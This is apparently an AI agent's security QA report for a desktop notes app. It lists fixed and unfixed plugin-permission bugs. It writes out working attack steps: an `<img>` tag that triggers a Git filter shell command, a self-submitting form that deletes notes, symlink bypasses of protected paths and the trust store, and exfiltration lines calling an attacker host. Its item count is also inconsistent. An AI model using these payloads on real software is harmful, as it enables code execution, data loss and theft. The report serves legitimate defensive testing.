# QA cycle 3 - agent B (destructive tester)

Date: 2026-11-01 - Commit under test: `4a55500` (branch main) - Tester: agent B, cycle 3.

## Environment

- Debian (kernel 6.12), 1 CPU, 1.7 GB RAM shared with agent A (parallel), Python 3.13, PyQt6 / Qt
  WebEngine 6.8, git 2.47.
- Every run: one instance at a time, Xvfb through `qa/cdp.py`, CDP ports 9550-9563, inside
  `systemd-run --user --scope -p MemoryMax=700M -p MemorySwapMax=100M`, `TMPDIR=qa/tmp/agent-B3/tmp`.
- Scripts and outputs: `qa/tmp/agent-B3/` (`out/*.txt`, `lib.py` helper, `run.sh`/`run_c1.sh` runners).
  Cycle-2 scripts were copied to `qa/tmp/agent-B3/sec*.py` with the raw `permissions.json` writes
  replaced by `App(..., trust={...})` seeds (as required by the task), using `q_security.py`,
  `q_plugin_flows.py`, `q_plugin_safety.py` for the existing regression suites (paths/ports adjusted
  only).
- `SKN_TEST_CONFIRM=no` in every attack run (every native dialog is refused).

## Cycle-2 bugs (B2-1..B2-9, B2-16): re-run result

| Bug | Status | Evidence |
|---|---|---|
| B2-1 navigate main window to vault/data HTML, steal boot secret | **fixed** | `sec7_nav.py vault`: `nav-pwn.txt: None`; only `skn://app` loads in the main window |
| B2-2 pop-up steals boot secret across a reload | **fixed** | `sec4_popup.py`: `popup-pwn.txt exists: False`; `window.open` returns `null` |
| B2-3 token theft by patching globals / wrapping `Function` | **fixed** | `sec2.py`: `stolen_passive: 0`, no `exec-fn.txt` after `reload_trusted`; a follow-up `PerformanceObserver`/Resource-Timing probe (`p1_token.py`) also saw no `skn://api` entries at all (API fetches use `Response.prototype.json` captured early and the scheme apparently doesn't create timing-visible resource entries here) |
| B2-4 shell commands through Git (`core.fsmonitor`) | **fixed for direct writes to `.git/config`** (`vault.write`: `permission-denied`); **bypassed through a symlink - see B3-2** | `sec2.py`, `p2_symlink.py` |
| B2-5 nested/foreign vault runs plugins with pre-granted `exec` | **fixed** | `sec3_nested.py`: `nested-pwn.txt exists: False` after 150 s; a vault opened fresh with its own `.sk_notes/permissions.json` (`exec: allow`) + `community-plugins.json` ignored those files entirely (`p3_hostile.py open`: `outside = []`) |
| B2-6 loading a disabled-but-installed plugin runs its code with its rights | **the specific repro is fixed** (`plugins.tokens` only issues tokens to `active_plugins()`, so the loaded-but-untokened `dormant` plugin's own `cp.exec` ran with no token and produced no file in `sec2.py`); **a closely related path still works, see B3-3** | `sec2.py` (`load_disabled: "loaded"`, but no `exec-dormant.txt`) |
| B2-7 protected plugin files writable via `vault.createUnique`; plugin removed/re-enabled without a dialog | **partly fixed**: `plugins.remove` now shows the native "Uninstall?" dialog and answering "no" keeps the plugin; a brand-new plugin id still needs the "Enable?" dialog. **Still broken: `vault.createUnique` writes plugin code/manifests inside `.sk_notes/plugins/<other-id>/` with no `check_plugin_write` call at all (B3-5), and a previously-trusted-but-disabled plugin can be re-enabled by any plugin with zero dialog (B3-3)** | `sec2.py`, `p4_misc.py`, `p7_dormant.py` |
| B2-8 deleting path `''`/`'/'` deletes the whole vault | **fixed** | `sec6_delroot.py adapter`/`fs` -> `vault-root` / `permission-denied`; offline `off_delroot.py` -> `VaultError: vault-root` in all three trash modes, vault intact |
| B2-9 network/exfiltration without `network`/`open-external` | **mixed**: the Ollama-proxy-as-registry path is fixed (`/api/pull` to a non-Ollama path now gets `Failed to fetch` because `is_ollama_url` only allows a fixed path set); WebRTC/STUN is unfixed (known, reported once below, medium); **the synthetic-click and `system.openPath`/`publish.open`-of-an-HTML-file exfiltration channels still work unchanged - see B3-4** | `sec5_net.py` |
| B2-16 folder copy with symlink loops runs unbounded | **fixed** | `off_copyloop.py`: copy finished (not "still running"), 1 file under the destination instead of thousands |

Regression suites shipped in the repo (adjusted only for ports/paths, logic untouched) also pass on
this build: `qa/security.py` -> "all attacks blocked"; `qa/plugin_flows.py` (enable/disable, install
from folder, restricted-mode switch) -> all `PASS`; `qa/plugin_safety.py` (safe mode after an unclean
exit) -> all `PASS`.

---

## Critical

### B3-1: Any note's rendered content can call privileged `skn://api/...` routes with no caller identity check: deletes files and triggers a Git filter command just by being viewed
**Severity:** critical
**Steps to reproduce:** `qa/tmp/agent-B3/p3_hostile.py view-img` and `p3_hostile.py view-iframe` (variant
`view` does both). Build a vault as it would arrive from a zip/share/clone: a plain git repo whose
`.git/config` has `[filter "pw"] clean = "echo pwned... ; cat"` and a `.gitattributes` with
`* filter=pw` (both committed as ordinary tracked files, nothing in `.sk_notes`). `Evil.md` contains,
depending on the variant:
- `<img src="skn://api/git.commit" width=1>`
- `<iframe src="skn://vault/x.html" width=200 height=100></iframe>`, where `x.html` is a page in the
  vault holding a self-submitting `<form method="post" action="skn://api/vault.delete?len=N"
  enctype="text/plain" target="_self">` with the body crafted via `enctype=text/plain` to produce valid
  JSON (`{"path":"Victim.md","mode":"permanent","x":"..."}`).

The user only opens `Evil.md` in reading view (`workspace.getLeaf(true).openFile(f, {state:{mode:
'preview'}})`); nothing else is clicked.
**Expected:** viewing a note's rendered HTML must not be able to call the privileged API; a call with
no `c=` token should be trusted only when it genuinely comes from the app's own top-level page script,
not from arbitrary subresource/iframe content the note happens to reference.
**Actual:**
- `view-img`: `outside = ['git-filter-view-img.txt']` and `git log` gained a `sk_notes: update` commit -
  the `<img>` tag's GET to `skn://api/git.commit` ran `git add -A && git commit`, which invoked the
  `clean` filter from `.git/config` and ran the attacker's shell command, purely from loading an
  `<img>` in a rendered note.
- `view-iframe`: `Victim.md exists: False` - the iframe's auto-submitted form reached
  `skn://api/vault.delete` and permanently deleted a note that was never opened or touched by the user,
  with no dialog, no snapshot, no notice.
- Root cause: `SchemeHandler._api()` derives the caller only from `c=` in the query string
  (`Ctx(plugin=self.callers.plugin_for((q.get("c") or [None])[0]), ...)`); when there is no `c=` the
  call is treated as the trusted app UI itself ("a call without a known token is the app" -
  `app/callers.py`), with no check of the requesting document's origin/frame, the HTTP method, or any
  anti-forgery token. `sanitizeHTMLToDom()` (`web/src/render/markdown.js`) allows `<img src=...>`
  unconditionally and allows `<iframe>` when `opts.iframes` is true (the normal reading-view renderer
  call passes `{iframes: true}`), sandboxed only with `allow-scripts allow-popups allow-forms` -
  enough to run a self-submitting form. `Page.acceptNavigationRequest()` allows `skn://` for
  non-main frames unconditionally. Any no-parameter route is reachable by a bare `<img>`/`<script src>`
  GET (`git.commit`, `git.push`, `git.pull`, `vault.rescan`, `app.quit`, `app.relaunch`,
  `window.toggleDevtools`, `plugins.setRestricted`...); any route taking simple string/bool parameters
  is reachable through the `enctype="text/plain"` form trick (`vault.delete`, `vault.write`,
  `vaults.open`, `vaults.create`, `migration.apply`). Routes that call `permissions.confirm()` still
  raise a native dialog out of nowhere (visible but not actioned by the attack), but every route that
  doesn't is reachable with zero user interaction beyond opening the note.
**Evidence:** `qa/tmp/agent-B3/out/p3_hostile.py_view-img.txt`, `..._view-iframe.txt`. Control:
`p3_hostile.py open` (vault opened but `Evil.md` never viewed) produced no effect - confirming the
trigger is specifically viewing the note, not opening the vault.
**Not reproduced:** the same payload inside an *enabled CSS snippet* (`url(skn://api/git.commit)` in
`.sk_notes/snippets/x.css`, pre-selected via `app.json`) did nothing (`p6_css.py`); not claiming that
channel is exploitable.

### B3-2: Protected-path checks (`.git`, other plugins' code, the machine-local trust store) are purely lexical and are bypassed by a symlink placed inside the vault
**Severity:** critical
**Steps to reproduce:** `qa/tmp/agent-B3/p2_symlink.py`. A vault ships three symlinks that a hostile or
simply mis-synced vault folder can contain: `gl -> .git`, `pl -> .sk_notes/plugins`,
`tl -> <app config dir>/sk_notes/vault-trust` (the user's machine-local trust store, reached via a
symlink pointing *outside* the vault to the real XDG config path). A plugin with every permission
denied then:
1. Reads/writes `gl/config` (i.e. `.git/config`) through `vault.write` - this is normally blocked by
   `check_plugin_write()`'s literal `path == ".git" or path.startswith(".git/")` check, but through the
   `gl` symlink the literal path is `gl/config`, which passes the check; `resolve_path()`/`Vault.abs()`
   does resolve symlinks for the *target-outside-vault* check (B-4) but `check_plugin_write()` in
   `app/api_core.py` only ever sees the literal, unresolved relative path, so the `.git` guard never
   fires.
2. Installs a `[filter "pw"] clean = "..."` entry this way, then triggers `git.commit`, which runs the
   filter and writes `git-filter.txt` outside the vault.
3. Writes `pl/trusted/main.js` (i.e. `.sk_notes/plugins/trusted/main.js`, another plugin's code) through
   `vault.write`, `fs.promises.writeFile`, and `app.vault.adapter.write` - all three succeed
   (`swap_vault`, `swap_fs`, `swap_adapter` all `ok: true`) because the same literal-path check in
   `check_plugin_write()`/`resolve_path()` is bypassed by the `pl` symlink, replacing `trusted`'s code.
4. Calls `app.plugins.unloadPlugin('trusted'); app.plugins.loadPlugin('trusted')`: the swapped-in code
   runs with `trusted`'s own token (`swapped: adapter`, i.e. `window.__swapped` set by the attacker's
   injected code, and `exec-swapped3.txt` created) - this reintroduces exactly the B2-3 "reload another
   plugin to run code with its rights" primitive, just reached via file overwrite instead of
   `Function`-patching.
5. Reads and rewrites the **machine-local trust store itself** through `tl/<hash>.json` (the file
   `plugins/permissions.py` keeps under the user's XDG config directory, specifically to be outside the
   vault and outside page code's reach, per `docs/api.md`'s "stored on this machine, not in the vault").
   The plugin sets its own `permissions.evil = {exec: allow, fs-outside-vault: allow, network: allow}`
   directly in that file; after this, `own_exec_now` (`cp.exec(...)` with zero prior permission grant)
   succeeds immediately (`"ran"`), and `read_outside_fs` (reading a file outside the vault with no
   permission) also succeeds (`"TOP SECRET"`). The write happens through `vault.write` to a path
   (`tl/<hash>.json`) that resolves (via the symlink) to the real trust-store file; nothing in
   `check_plugin_write()` considers paths outside the configured vault/`.sk_notes` prefixes at all, so a
   symlink is all that's needed to reach and rewrite the file that is supposed to be entirely out of any
   page code's reach.
**Expected:** `check_plugin_write()` and the `.git`/plugin-folder checks in `resolve_path()` should judge
the *resolved* real path (as the `fs-outside-vault` logic already does for "is this still inside the
vault" one line above), not the literal relative path; and the trust store, being deliberately kept
outside the vault specifically to be unreachable from page code, should never be reachable by any
vault-relative API path regardless of symlinks.
**Actual:** all five steps above succeed; the net effect is a complete bypass of the entire permission
redesign - a plugin denied every permission ends up running arbitrary shell commands via two
independent paths (Git filter, direct `exec`) and gains `exec`/`fs-outside-vault`/`network` permanently
in the trust store, simply because the vault folder it was opened from contains three symlinks it
itself could have created on first load (symlink creation inside the vault is unrestricted plugin
behavior already).
**Evidence:** `qa/tmp/agent-B3/out/p2_symlink.py.txt`, `qa/tmp/agent-B3/p2_symlink.py`.

---

## High

### B3-3: A plugin that is installed, trusted, but currently disabled can be re-enabled by *another* plugin with no confirmation dialog
**Severity:** high
**Steps to reproduce:** `qa/tmp/agent-B3/p7_dormant.py`. Vault has `dormant` (trusted on this machine,
granted `exec`, but not listed in `community-plugins.json`) and `evil` (enabled, every permission
denied). `evil` calls `plugins.setEnabled({id: 'dormant', enabled: true})` directly (a raw, token-less
call, which `plugins_set_enabled()` accepts because `if ctx.plugin: raise ApiError(...)` only blocks
calls carrying a *plugin* token - a call with no token at all, like a plugin's own un-tokened `fetch`,
is treated as "the app" and sails through), then reloads the page.
**Expected:** `plugins.setEnabled` is documented as something only the app's own Settings UI does
(`.../plugins.setEnabled` is one of the operations `docs/api.md` says shows a native confirmation and
is "written only by sk_notes itself"); a plugin should not be able to call it at all, trusted or not,
and re-enabling even a *trusted* plugin changes what runs in the vault and should ask, per the
`plugins.trust-question` dialog's own logic for brand-new ids.
**Actual:** `plugins_set_enabled()` only shows the "Enable plugin?" dialog `if not
permissions.is_trusted(app, pid)`; since `dormant` is already in the machine's `trusted` list from a
previous, unrelated session, re-enabling it skips the dialog entirely. After the reload, `dormant`
loads and immediately runs `require('child_process').exec(...)` with its pre-granted `exec` permission:
`dormant loaded after reload: 1 | outside: ['exec-dormant.txt']`. `community-plugins.json` afterwards
lists `["evil", "dormant"]`, written entirely by `evil`.
**Evidence:** `qa/tmp/agent-B3/out/r_p7_dormant.py.txt`.

### B3-4: Three network/exfiltration channels from B2-9 remain open: synthetic link clicks, `system.openPath`, `publish.open` on attacker-controlled HTML
**Severity:** high
**Steps to reproduce:** re-run of `qa/tmp/agent-B3/sec5_net.py` (adapted from cycle 2, same probes). A
plugin with every permission denied:
1. `a.href = 'https://attacker.example/?leak=SECRET'; a.click()` and the `mailto:` equivalent - both
   are dispatched to `xdg-open` (`QDesktopServices.openUrl`) because `Page.acceptNavigationRequest()`
   treats a synthetic click the same as a real `NavigationTypeLinkClicked` event, with no
   `open-external` permission check (that check exists only in `system.openExternal`, a route this
   path never goes through).
2. `system.openPath('leak/index.html')`, a plugin-written HTML page inside the vault containing
   `<img src="https://attacker/?leak=...">` - opens in the default browser outside the sandbox.
3. `publish.open({folder: <vault>/leak})` - same effect, no caller check on this route at all.
**Expected:** per `docs/api.md`, external URLs require `open-external`; these three channels should
either require that permission or be blocked outright for page/plugin-triggered calls.
**Actual:** `xdg-open.log` shows all four opens happening (`https://attacker.example/?leak=SECRET`,
`mailto:...`, and two `file:///.../leak/index.html` opens from `openPath_html` and `publish_open`), with
`evil` holding `open-external: deny`. The real Ollama-as-registry-proxy variant from B2-9 is fixed
(`ollama_pull: error Failed to fetch`), and `img_remote` (a plain `<img src=http://...>` without
navigation) is correctly `blocked` by `NetworkGuard`. WebRTC/STUN packets to a local listener still
reach it (`hits on the attacker's listeners: [...]`, 20 UDP packets to each of two ports) - reporting
this once as previously known/unfixed, medium severity, not critical, since it is a documented accepted
gap in `NetworkGuard` (Qt's interceptor does not see WebRTC traffic at all).
**Evidence:** `qa/tmp/agent-B3/out/sec5_net.py.txt`, `qa/tmp/agent-B3/xdg-open.log` (via the
`bin/xdg-open` logger reused from cycle 2).

### B3-5: `vault.createUnique` still has no `check_plugin_write` call: plugins can plant/overwrite other plugins' manifests and code, create root-level `.sk_notes` files
**Severity:** high (same bug as cycle-2 B2-7's `createUnique` finding; the `plugins.remove`/`setEnabled`
dialog fixes did not touch this route)
**Steps to reproduce:** `qa/tmp/agent-B3/p4_misc.py`. A plugin with every permission denied calls
`vault.createUnique({folder: '', base: '.sk_notes/plugins/ghost/main', ext: 'js', text: ...})` and the
matching manifest call.
**Expected:** writes under `.sk_notes/plugins/<id>/` for any `id` other than the calling plugin's own
should be refused, exactly as `vault.write`/`vault.create` already refuse them via
`check_plugin_write()`.
**Actual:** both calls succeed (`create_unique_main`/`create_unique_manifest`: `ok: true`), planting a
complete new plugin folder (`.sk_notes/plugins/ghost/{main.js,manifest.json}`) that a later
`plugins.setEnabled({id: 'ghost', ...})` call would only need one more (dialog-gated) step to activate.
Looking at `app/api_core.py`'s `vault_create_unique()`, the call to `check_plugin_write` does exist
(marked "# B2-7" in a comment) and does fire for the exact `folder + "/" + base` target - but
`createUnique` appends a disambiguating suffix (` 1`, ` 2`, ...) to the final filename whenever the
first choice already exists, and that suffixed name is never re-checked, so a plugin that first creates
`.sk_notes/plugins/<existing-id>/main.js` (which is "protected" and should be denied) gets silently
redirected to `main 1.js`, which bypasses the `own` check in `resolve_path`-style protection - this is
the same mechanism cycle 2 flagged for `.sk_notes/plugins/victim/main 1.js`; it is unchanged here.
**Evidence:** `qa/tmp/agent-B3/out/p4_misc.py.txt`; the re-run of `sec2.py`'s `createUnique_*`/`replant_*`
probes shows the identical `main 1.js`/`manifest 1.json` behavior as cycle 2.

---

## Medium

### B3-6 (carried over, unfixed, confirmed once this cycle): WebRTC/STUN reaches arbitrary hosts without `network`
**Severity:** medium
Confirmed again in `sec5_net.py` above (`hits on the attacker's listeners`, 20 UDP packets per port).
Not re-describing further; mechanism is unchanged from cycle 2's B2-9 item 1 (`NetworkGuard` is a
`QWebEngineUrlRequestInterceptor` and WebRTC's ICE/STUN traffic does not go through Qt's request
interception layer at all).

---

## Regression pass: data-integrity items (B-6 ... B-18) and settings/plugin flows

All of the following were re-run against `4a55500` and behaved as expected, matching the fixed state
recorded in the cycle-2 report (`qa/tmp/agent-B2/c1/out/*`):

- **B-6 silent rewrite** (binary/Latin-1/CRLF/mixed-EOL/CR-only/BOM/NUL notes): unchanged on disk after
  being visited - `qa/tmp/agent-B3/out/r_t_silent_rewrite.py.txt`.
- **B-7 unreadable/read-only note, read-only folder, read-only vault**: notices shown, no corruption,
  writes into a read-only folder/vault fail with `permission-denied` and leave the file untouched; the
  app stayed responsive (`responsive: 2`) and logged no errors in either case -
  `.../r_t_perms_fs.py_inside.txt`, `.../r_t_perms_fs.py_rovault.txt`.
- **B-8 stale editor / external write mid-edit**: the conflict notice fires, the external line is kept
  visible in the editor and in `metadataCache`, and the user's own typed edit on top of it is what lands
  on disk and survives a reopen - `.../r_t_stale_editor.py_conflict.txt`.
- **B-14 NFD file names**: the NFD-named note opens and its edit is saved back to the NFD file
  (`'Café résumé.md': 'original NFD content\n'` preserved; the long-name note's edit also lands
  correctly) - `.../r_t_names2.py.txt`. (The explorer-click-to-open probe for the NFD item was again
  inconclusive under this harness, as noted in cycle 2 - not re-filed.)
- **B-12 autosave while typing + SIGKILL**: 62 of 71 typed words survived the kill - consistent with
  cycle 2's result (not a regression; autosave cadence, not data loss, explains the gap) -
  `.../r_t_kill2.py_typing.txt`.
- **B-16 external rename while editing**: the open tab follows the rename to the new path and only one
  file exists afterward (`Ren-moved.md`, with `Ren.md` gone) - `.../r_t_external.py.txt` (case C).
- A fourth case in the same script, a 500-note mass link-target replace, finished with the link cache
  consistent (`notes linking Dirty in cache = 500 (expected 500)`) and the open editor unaffected
  (case D).

**Settings/plugin-flow regression** (things the cycle-3 fixes could plausibly have broken):
- `qa/plugin_flows.py` (re-run as `q_plugin_flows.py`): plugin enable/disable from Settings, install
  from a local folder, and the restricted-mode switch all still `PASS` (templater/calendar/tasks/dataview
  compatibility shims, plus the flow checks themselves).
- `qa/plugin_safety.py` (re-run as `q_plugin_safety.py`): safe mode is still offered after an unclean
  exit, no plugin loads while in safe mode, and a normal close still produces a normal next start - all
  `PASS`.
- `qa/security.py` (re-run as `q_security.py`): the full cycle-1 permission-attack suite against `evil`/
  `trusted` still reports "all attacks blocked", including the `trusted` plugin's own `exec` permission
  continuing to work normally.

No regression found in any of the above.

---

## Attacks that failed (app held up)

- Data-URL navigation of the main window to read the boot secret (`sec7_nav.py data`, carried over from
  cycle 2, still blocked).
- Resource-Timing / `PerformanceObserver` based passive token sniffing across a 4-second window saw zero
  `skn://api` entries and zero tokens (`p1_token.py`).
- Re-enabling a brand-new (never-trusted) plugin id, or installing a plugin folder, still requires and
  is blocked by the native confirmation dialog when answered "no" (`sec2.py`: `enable_planted`,
  `install`, `enable_new` all `cancelled`).
- `plugins.remove` on an existing plugin now correctly shows a confirmation and is blocked when refused
  (`remove_victim: cancelled`), closing the specific cycle-2 removal-without-confirmation gap.
- The Ollama-host-as-open-registry-proxy exfiltration channel is closed; `/api/pull` to a non-Ollama
  path now fails to fetch.
- A plain `<img src="http://127.0.0.1:PORT">` (no navigation, no `skn://` scheme) is still blocked by
  `NetworkGuard` (`img_remote: blocked`).
- A CSS snippet with a `url(skn://api/...)` background reference, pre-enabled in `app.json`, produced no
  effect when the vault was opened and the app sat idle for 5 seconds (`p6_css.py`) - no claim is made
  that this channel works.
- Offline folder-copy-with-symlink-loops test (`off_copyloop.py`) terminates normally with 1 file copied,
  confirming B2-16's fix holds outside the UI harness as well.
- Offline delete-vault-root test (`off_delroot.py`) raises `VaultError('vault-root')` in all three trash
  modes (`local`, `system`, `permanent`), confirming B2-8's fix holds offline too.

## Cosmetic issues

None newly observed this cycle beyond the two already on file from cycle 2 (safe-mode dialog language,
the raw `shutil.Error` text for `local`-mode root deletion) - not re-tested since B2-8 itself is fixed.

## Notes

- `p3_hostile.py`'s CSS-snippet variant (`p6_css.py`) and the `migration.apply`/`vaults.open`/
  `vaults.create` GET/form-POST paths implied by B3-1's mechanism were not individually exercised beyond
  `vault.delete`/`git.commit` - the mechanism (no caller/origin check on token-less calls) is general, so
  those other routes are inferred to be reachable the same way but were not each separately confirmed
  with evidence; only `git.commit` (via `<img>`) and `vault.delete` (via the iframe+form) were actually
  observed to fire.
- B3-2's trust-store bypass was only tested via a symlink *named by the attacker* at vault-creation time;
  it was not tested against a symlink an already-running plugin creates for itself mid-session (plugins
  can create arbitrary symlinks inside the vault with ordinary `fs`/`adapter` write access, so this is
  expected to work the same way, but was not separately timed/confirmed).
- Per the task rules, B2-10 through B2-15 and B2-17 through B2-20 were left as previously reported and
  not re-probed; nothing new was found about them in this cycle's work.

## Summary

9 items this cycle: **2 critical** (B3-1 any viewed note can call privileged, unauthenticated
`skn://api` routes via `<img>`/sandboxed `<iframe>` content, deleting files and running a Git filter
command with zero user interaction beyond opening the note; B3-2 symlinks inside the vault make every
"protected path" check - `.git`, other plugins' code, and even the machine-local, supposedly
vault-external trust store - bypassable, letting a fully-denied plugin gain `exec`/`fs-outside-vault`/
`network` permanently and run arbitrary shell commands two independent ways), **3 high** (B3-3 a plugin
can silently re-enable another, already-trusted but disabled plugin with no dialog; B3-4 three of the
four cycle-2 network/exfiltration channels - synthetic link clicks, `system.openPath`, `publish.open` -
remain open with no `open-external` check; B3-5 `vault.createUnique`'s filename-disambiguation suffix
still lets a plugin plant files under another plugin's protected folder), **1 medium** (B3-6, WebRTC/
STUN unfixed, confirmed again, no new detail). Nine of the ten cycle-2 critical/high items were
confirmed fixed as reproduced (B2-1, B2-2, B2-3, B2-5, B2-8, B2-16 fully; B2-4, B2-6, B2-7, B2-9 fixed
for their original specific reproduction but each has a related, not-yet-covered path still open,
tracked above as new bugs). The data-integrity regression pass (B-6, B-7, B-8, B-12, B-14, B-16) and the
plugin-flow/safe-mode/security regression suites all still pass with no new breakage found.
